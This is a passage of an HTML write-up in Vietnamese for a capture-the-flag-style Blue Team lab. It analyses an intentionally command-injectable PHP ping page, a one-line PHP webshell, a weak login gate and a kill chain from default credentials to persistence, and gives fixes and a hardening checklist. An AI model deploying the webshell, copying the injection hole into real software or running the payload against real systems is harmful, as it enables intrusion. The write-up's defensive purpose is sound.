+<h3>V4 — OS Command Injection (<code>diag.php</code>)</h3>
+<p><span class="badge warn">CWE-78</span> OS Command Injection · liên quan <strong>W3</strong></p>
+
+<pre class="cmd"><code>&lt;?php
+require __DIR__ . '/common.php';
+require_login();
+$host = isset($_GET['host']) ? (string)$_GET['host'] : '';
+$out = '';
+if ($host !== '') {
+  // intentional OS command injection
+  $out = shell_exec('ping -c 1 ' . $host . ' 2&gt;&amp;1');
+}
+?&gt;</code></pre>
+
+<p><strong>Phân tích:</strong></p>
+<ul>
+  <li>Input user nối vào chuỗi lệnh shell → metachar <code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>$()</code> phá vỡ ý định “chỉ ping”.</li>
+  <li>Log: <code>host=127.0.0.1%3Buname</code> → <code>ping -c 1 127.0.0.1;uname</code> → chạy thêm <code>uname</code>.</li>
+  <li>Tiến trình chạy với quyền user web (<code>www-data</code>) — vẫn đủ để đọc file, reverse shell, ghi webshell tùy cấu hình.</li>
+</ul>
+<p><strong>Cách vá:</strong></p>
+<pre class="cmd"><code>// 1) Validate nghiêm: chỉ IP/hostname hợp lệ
+if (!filter_var($host, FILTER_VALIDATE_IP) &amp;&amp; !preg_match('/^[a-z0-9.-]+$/i', $host)) {
+  exit('invalid host');
+}
+// 2) Không qua shell: escapeshellarg + hoặc API không shell
+$out = shell_exec('ping -c 1 ' . escapeshellarg($host) . ' 2&gt;&amp;1');
+// 3) Tốt hơn: bỏ hẳn shell_exec; dùng thư viện / capability riêng; tách network diag ra tool nội bộ có ACL</code></pre>
+
+<!-- V5 -->
+<h3>V5 — Webshell / RCE artifact (<code>uploads/media_4256.php</code>)</h3>
+<p><span class="badge warn">CWE-94</span> Code Injection · <span class="badge warn">CWE-434</span> Unrestricted Upload · liên quan <strong>F1</strong></p>
+
+<pre class="cmd"><code>&lt;?php
+if(isset($_REQUEST['c'])){ system($_REQUEST['c']); }
+?&gt;</code></pre>
+
+<p><strong>Phân tích:</strong></p>
+<ul>
+  <li>File PHP trong thư mục web-accessible gọi <code>system()</code> trên tham số request → <strong>RCE đầy đủ</strong> với mọi request tới file này.</li>
+  <li>Trên access log: hàng loạt <code>POST /uploads/media_4256.php</code> từ IP attacker.</li>
+  <li>Trong lab, shell có thể được tạo qua OS inject (W3) hoặc đã được attacker thả sẵn — điểm chung: <strong>document root cho phép thực thi code upload</strong>.</li>
+</ul>
+<p><strong>Cách vá / harden:</strong></p>
+<ul>
+  <li>Upload chỉ vào ngoài docroot hoặc storage không exec; rename random; scan nội dung.</li>
+  <li>Web server: <code>php_admin_flag engine off</code> trong <code>/uploads</code>, hoặc chỉ static.</li>
+  <li>WAF / EDR: alert khi PHP mới xuất hiện dưới webroot; monitor <code>system/exec/passthru</code>.</li>
+  <li>IR: xóa webshell, rotate secret đã lộ (APP_KEY, token DB), reset credential <code>admin</code>/<code>oracle</code>.</li>
+</ul>
+
+<!-- Auth gate -->
+<h3>Ghi chú — <code>require_login()</code> không đủ</h3>
+<pre class="cmd"><code>function require_login() {
+  if (empty($_SESSION['user'])) {
+    header('Location: /login.php');
+    exit;
+  }
+}</code></pre>
+<p>Hàm này chỉ đảm bảo “đã có session”. Khi login yếu + thiếu phân quyền (mọi user = admin chức năng), toàn bộ SQLi/LFI/RCE nằm sau một cánh cửa dễ mở. Blue Team cần kiểm soát <strong>cả authentication lẫn authorization + input validation</strong>.</p>
+
+<!-- Kill chain map -->
+<h3>Chuỗi khai thác ↔ code (SEED=42)</h3>
+<pre class="out"><code>login.php (admin/admin)
+    → search.php  UNION → hdk_695c024ed1f3
+    → page.php    file=.env → APP_KEY=1005140e80b5b3
+    → diag.php    host=...;uname → RCE nhẹ
+    → uploads/media_4256.php → webshell persistence
+    → (OS) SSH oracle / cron .cache / SUID / beacon C2</code></pre>
+
+<div class="box warn">
+  <strong>Checklist vá nhanh cho app tương tự production:</strong>
+  <ol style="margin:0.5rem 0 0; padding-left:1.25rem">
+    <li>Đổi/xoá default cred; hash password; MFA admin.</li>
+    <li>Mọi SQL dùng prepared statement; least-privilege DB user.</li>
+    <li>Đọc file theo allowlist + <code>realpath</code> nằm trong base.</li>
+    <li>Cấm <code>shell_exec/system</code> với input user; hoặc bỏ tính năng diag trên internet.</li>
+    <li>Upload không exec; CSP/hardening vhost; monitor file mới dưới webroot.</li>
+    <li>Không để <code>.env</code> / secret trong document root.</li>
+  </ol>
+</div>
+
+<footer>
+  Write-up Level 3 · dữ liệu sinh từ <code>CTF_SEED=42</code> · góc Blue Team / IR ·
+  mở file này bằng trình duyệt hoặc phục vụ tĩnh tại <code>/write-up/</code>
+</footer>
+
+</div>
+</body>
+</html>
